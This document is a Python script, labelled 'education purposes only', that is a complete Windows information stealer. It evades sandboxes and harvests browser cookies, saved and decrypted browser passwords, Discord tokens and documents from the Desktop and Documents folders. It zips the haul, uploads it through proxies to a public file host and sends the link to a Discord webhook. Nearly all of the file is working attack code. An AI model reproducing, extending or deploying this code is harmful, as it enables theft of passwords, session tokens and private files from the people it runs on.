# EDUCATION PURPOSES ONLY
# DO NOT USE THIS FOR ILLEGAL ACTIVITIES
# It is illegal under the Computer Fraud and Abuse Act of 1986 and the National Information Infrastructure Protection Act
# Use this only in a lab environment
import os, sys, base64, marshal, zlib, codecs, socks, requests, random, sqlite3, json, shutil
import win32crypt, browser_cookie3, win32clipboard, string, time, mimetypes, pyautogui
from itertools import cycle
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

def is_sandbox():
    sandbox_users = ['bruno', 'abby', 'george', 'sandbox', 'virus', 'malware', 'test']
    sandbox_hostnames = ['sandbox', 'virus', 'malware']
    sandbox_procs = ['vboxservice.exe', 'vmtoolsd.exe', 'vboxtray.exe', 'vmwaretray.exe',
                     'sandboxie', 'wireshark', 'fiddler', 'processhacker']
    
    username = os.getenv('USERNAME', '').lower()
    hostname = os.getenv('COMPUTERNAME', '').lower()
    
    if username in sandbox_users or any(s in hostname for s in sandbox_hostnames):
        return True
        
    running_procs = [p.name().lower() for p in psutil.process_iter(['name'])]
    if any(p in ' '.join(running_procs) for p in sandbox_procs):
        return True
        
    return False

def skc(s):
    # Use Fernet for secure string encryption
    key = Fernet.generate_key()
    f = Fernet(key)
    enc = f.encrypt(s.encode())
    return base64.b85encode(key + enc).decode()

def dsk(s):
    # Decrypt Fernet encrypted string
    data = base64.b85decode(s.encode())
    key, enc = data[:44], data[44:] # Fernet key is 44 bytes
    f = Fernet(key)
    return f.decrypt(enc).decode()

def setup_proxy_session():
    try:
        session = requests.Session()
        proxy = random.choice([
            skc("socks5://127.0.0.1:9050"),
            skc("socks5://127.0.0.1:9051"), 
            skc("socks5://127.0.0.1:9052"),
            skc("socks5://127.0.0.1:9053"),
            skc("socks5://127.0.0.1:9054")
        ])
        
        auth = {
            'username': 'rxrtpdec',
            'password': 'wuwdw7outbzg'
        }
        
        proxy_url = f"socks5://{auth['username']}:{auth['password']}@{dsk(proxy).split('://')[1]}"
        
        session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        
        # Test connection
        r = session.get('http://httpbin.org/ip', timeout=10)
        if r.status_code != 200:
            raise Exception()
            
        return session
    except:
        return requests.Session()

def upload_to_litterbox(file_path):
    try:
        session = setup_proxy_session()
        with open(file_path, 'rb') as file:
            files = {
                'reqtype': (None, 'fileupload'),
                'time': (None, '72h'),
                'fileToUpload': (os.path.basename(file_path), file, 'application/octet-stream')
            }
            response = session.post(dsk(skc('https://litterbox.catbox.moe/resources/internals/api.php')), 
                                  files=files, timeout=30)
            if response.status_code == 200:
                return response.text
    except:
        pass
    return None

DISCORD_WEBHOOK = skc("webhook_goes_here")

class SystemManager:
    def __init__(self):
        if is_sandbox():
            # Run calculator if in sandbox
            os.system('calc.exe')
            sys.exit()
            
        self._r = lambda x: ''.join(random.choices(string.ascii_letters + string.digits, k=x))
        self._p = os.path.join
        self._s = self._get_sys_info()
        self._d = self._p(os.getenv('TEMP'), self._r(16))
        os.makedirs(self._d, exist_ok=True)
        
    def _get_sys_info(self):
        return {
            'username': os.getenv('USERNAME', 'N/A'),
            'computer': os.getenv('COMPUTERNAME', 'N/A'),
            'time': datetime.now().strftime("%H%M%S")
        }

    def _collect_browser(self):
        try:
            _d = []
            _b = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge, browser_cookie3.brave]
            for _f in _b:
                try:
                    _d.extend(list(_f(domain_name='')))
                except:
                    continue
            
            if _d:
                cookies_file = self._p(self._d, 'browser_cookies.txt')
                with open(cookies_file, 'w') as f:
                    for _r in _d:
                        f.write(f'Domain: {_r.domain}\nName: {_r.name}\nValue: {_r.value}\n\n')
        except:
            pass

    def _collect_secure(self):
        _paths = [
            ('Google\\Chrome', 'Default'),
            ('Microsoft\\Edge', 'Default'),
            ('BraveSoftware\\Brave-Browser', 'Default'),
            ('Mozilla\\Firefox', 'Profiles')
        ]
        
        for _browser, _profile in _paths:
            try:
                if _browser == 'Mozilla\\Firefox':
                    _profile_path = self._p(os.getenv('APPDATA'), f'{_browser}\\{_profile}')
                    for profile in os.listdir(_profile_path):
                        _c = self._p(_profile_path, f'{profile}\\logins.json')
                        if os.path.exists(_c):
                            _t = self._p(self._d, f'secure_temp_{self._r(8)}.json')
                            shutil.copy2(_c, _t)
                            with open(_t, 'r') as f:
                                data = json.load(f)
                                with open(self._p(self._d, f'passwords_Firefox.txt'), 'w') as out:
                                    for entry in data.get('logins', []):
                                        out.write(f'URL: {entry.get("hostname")}\nUsername: {entry.get("username")}\nPassword: {entry.get("password")}\n\n')
                            os.remove(_t)
                else:
                    _c = self._p(os.getenv('LOCALAPPDATA'), f'{_browser}\\User Data\\{_profile}\\Login Data')
                    if os.path.exists(_c):
                        _t = self._p(self._d, f'secure_temp_{self._r(8)}.db')
                        shutil.copy2(_c, _t)
                        _db = sqlite3.connect(_t)
                        _q = _db.cursor()
                        _q.execute('SELECT origin_url, username_value, password_value FROM logins')
                        browser_name = _browser.split('\\')[-1]
                        with open(self._p(self._d, f'passwords_{browser_name}.txt'), 'w') as f:
                            for _r in _q.fetchall():
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(_r[2], None, None, None, 0)[1]
                                    f.write(f'URL: {_r[0]}\nUsername: {_r[1]}\nPassword: {decrypted.decode()}\n\n')
                                except:
                                    f.write(f'URL: {_r[0]}\nUsername: {_r[1]}\nPassword: [ENCRYPTED]\n\n')
                        _db.close()
                        os.remove(_t)
            except:
                continue

    def _collect_tokens(self):
        _l = {
            'discord': self._p(os.getenv('APPDATA'), 'discord\\Local Storage\\leveldb'),
            'discordcanary': self._p(os.getenv('APPDATA'), 'discordcanary\\Local Storage\\leveldb')
        }
        _f = []
        for _name, _p in _l.items():
            if os.path.exists(_p):
                for _i in os.listdir(_p):
                    if _i.endswith('.ldb'):
                        try:
                            with open(self._p(_p, _i), 'r', errors='ignore') as file:
                                for _l in file:
                                    if 'mfa.' in _l:
                                        _f.extend([_t.strip() for _t in _l.split() if _t.strip().startswith('mfa.')])
                        except:
                            continue
                            
        if _f:
            tokens_file = self._p(self._d, 'tokens.txt')
            with open(tokens_file, 'w') as f:
                f.write('\n'.join(_f))

    def _collect_files(self):
        _e = ['.txt', '.doc', '.docx', '.pdf', '.pptx', '.ppt', '.xlsx', '.xls']
        _m = 10 * 1024 * 1024  # 10MB max
        
        _paths = [
            self._p(os.getenv('USERPROFILE'), 'Documents'),
            self._p(os.getenv('USERPROFILE'), 'Desktop')
        ]
        
        with open(self._p(self._d, 'found_files.txt'), 'w') as f:
            for _path in _paths:
                for _x in _e:
                    try:
                        for _i in Path(_path).rglob(f'*{_x}'):
                            if os.path.getsize(_i) < _m:
                                f.write(f'{_i}\n')
                                try:
                                    shutil.copy2(_i, self._p(self._d, 'files'))
                                except:
                                    continue
                    except:
                        continue

    def _compress(self):
        try:
            _a = self._p(os.getenv('TEMP'), f'data_{self._r(8)}.zip')
            shutil.make_archive(_a[:-4], 'zip', self._d)
            return _a
        except:
            return None

    def _send(self, _p):
        if not _p or not os.path.exists(_p):
            return
            
        try:
            file_url = upload_to_litterbox(_p)
            if file_url:
                embed = {
                    "embeds": [{
                        "title": "Data Collection Results",
                        "color": 0x2F3136,
                        "fields": [
                            {
                                "name": "System Info",
                                "value": f"User: {self._s['username']}\nPC: {self._s['computer']}\nTime: {self._s['time']}",
                                "inline": False
                            },
                            {
                                "name": "Download",
                                "value": f"[Click to download]({file_url})",
                                "inline": False
                            }
                        ],
                        "footer": {"text": f"ID: {self._r(8)}"}
                    }]
                }
                
                try:
                    session = setup_proxy_session()
                    session.post(dsk(DISCORD_WEBHOOK), json=embed, timeout=30)
                except:
                    pass
                        
        except:
            pass

    def _cleanup(self):
        try:
            shutil.rmtree(self._d)
        except:
            pass

    def execute(self):
        try:
            os.makedirs(self._p(self._d, 'files'), exist_ok=True)
            
            _o = [
                self._collect_browser,
                self._collect_secure,
                self._collect_tokens,
                self._collect_files
            ]
            
            for _f in _o:
                try:
                    _f()
                except:
                    continue

            _p = self._compress()
            if _p:
                self._send(_p)
                os.remove(_p)
            self._cleanup()
        except:
            pass

if __name__ == "__main__":
    SystemManager().execute()
